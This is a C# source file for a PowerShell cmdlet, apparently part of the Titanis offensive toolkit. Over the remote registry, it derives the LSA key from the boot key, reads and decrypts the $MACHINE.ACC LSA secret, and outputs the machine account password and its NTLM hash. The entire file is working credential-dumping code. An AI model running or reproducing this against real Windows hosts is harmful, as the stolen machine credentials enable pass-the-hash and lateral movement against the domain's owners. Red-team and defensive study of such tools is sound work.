using System;
using System.Management.Automation;
using System.Text;
using System.Threading;
using Titanis.Crypto;
using Titanis.Msrpc.Msrrp;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboRegMachineAccountInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string SecretName { get; init; } = "$MACHINE.ACC";
		public DateTime? LastWriteTime { get; init; }
		public string? Password { get; init; }
		public byte[]? PasswordBytes { get; init; }
		public byte[]? NtlmHash { get; init; }
		public string? NtlmHashText { get; init; }
		public byte[]? SecretRawBytes { get; init; }
		public byte[]? EncryptedBytes { get; init; }
	}

	[Cmdlet(VerbsCommon.Get, "TBORegMachineAccount")]
	[OutputType(typeof(TboRegMachineAccountInfo))]
	public sealed class GetTBORegMachineAccount : TboRegLsaSecretCmdlet
	{
		private const string MachineSecretName = "$MACHINE.ACC";

		[Parameter(ValueFromPipelineByPropertyName = true)]
		public byte[]? LsaKeyBytes { get; set; }

		[Parameter(ValueFromPipelineByPropertyName = true)]
		public string? LsaKey { get; set; }

		protected override void ProcessRecord(ISmbProviderInfo smb, CancellationToken cancellationToken)
		{
			ExecuteRegistryOperation(smb, cancellationToken, session =>
			{
				var lsaKey = ResolveLsaKey(smb, session.Client, cancellationToken, out _);
				if (lsaKey == null || lsaKey.Length == 0)
				{
					this.WriteWarning("Get-TBORegMachineAccount failed to derive the LSA key.");
					return;
				}

				DateTime? lastWriteTime;
				var secretBlob = TryReadSecretValue(session.Client, MachineSecretName, "CurrVal", cancellationToken, out lastWriteTime);
				if (secretBlob == null || secretBlob.Length == 0)
				{
					this.WriteWarning("Get-TBORegMachineAccount failed to read $MACHINE.ACC: value is empty.");
					return;
				}

				var decrypted = DecryptLsaSecret(secretBlob, lsaKey);
				if (decrypted == null || decrypted.Length == 0)
				{
					this.WriteWarning("Get-TBORegMachineAccount failed to decrypt $MACHINE.ACC: data was empty.");
					return;
				}

				byte[]? payload = null;
				string? password = null;
				if (TryExtractSecretPayload(decrypted, out var payloadBytes))
				{
					payload = payloadBytes;
					password = FormatSecretText(MachineSecretName, payloadBytes, TryDecodeSecretString(payloadBytes));
				}

				byte[]? ntlmHash = null;
				if (payload != null && payload.Length > 0)
				{
					var hashInput = TrimTrailingNulls(payload);
					if (hashInput.Length > 0 && hashInput.Length % 2 == 0)
						ntlmHash = SlimHashAlgorithm.ComputeHash<Md4Context>(hashInput);
				}

				if (ntlmHash == null && !string.IsNullOrEmpty(password))
				{
					var passwordBytes = Encoding.Unicode.GetBytes(password);
					ntlmHash = SlimHashAlgorithm.ComputeHash<Md4Context>(passwordBytes);
				}

				this.WriteObject(new TboRegMachineAccountInfo
				{
					ServerName = this.ServerName,
					LastWriteTime = lastWriteTime,
					Password = password,
					PasswordBytes = payload,
					NtlmHash = ntlmHash,
					NtlmHashText = ntlmHash?.ToHexString(),
					SecretRawBytes = decrypted,
					EncryptedBytes = secretBlob
				});
			});
		}

		private byte[]? ResolveLsaKey(
			ISmbProviderInfo smb,
			IRegistryClient client,
			CancellationToken cancellationToken,
			out string? lsaKeySource)
		{
			lsaKeySource = null;
			if (this.LsaKeyBytes != null && this.LsaKeyBytes.Length > 0)
				return this.LsaKeyBytes;

			if (!string.IsNullOrWhiteSpace(this.LsaKey))
			{
				try
				{
					return Titanis.BinaryHelper.ParseHexString(this.LsaKey.AsSpan());
				}
				catch (Exception ex)
				{
					throw new ArgumentException($"Invalid LSA key value: {ex.Message}", nameof(this.LsaKey), ex);
				}
			}

			var bootKey = ExtractBootKey(client, cancellationToken);
			return ExtractLsaKey(smb, client, bootKey, cancellationToken, out lsaKeySource);
		}
	}
}
